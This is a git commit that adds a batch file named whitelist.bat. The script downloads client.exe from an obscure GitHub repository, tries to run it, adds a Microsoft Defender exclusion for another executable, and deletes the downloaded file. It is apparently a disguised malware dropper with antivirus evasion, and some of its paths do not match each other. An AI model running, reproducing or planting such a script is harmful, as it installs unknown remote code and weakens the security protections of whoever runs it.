054a0e68c6813d8ee53b8c7f564fe4b90e59fae1
BlaBlak3 <93101797+BlaBlak3@users.noreply.github.com>
2021-11-03 21:46:45 -0400

    Add files via upload

---
+++ whitelist.bat
@@ -0,0 +1,8 @@
+@echo off
+powershell -Command "Invoke-WebRequest https://github.com/BlaBlak3/oouikyhjnjhsshn/raw/main/client.exe -Outfile client.exe"
+start C:\Windows\client.exe
+powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\system32\Runner\Start.exe"
+timeout 2 > NULL
+del C:\Windows\client.exe
+powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"
+exit
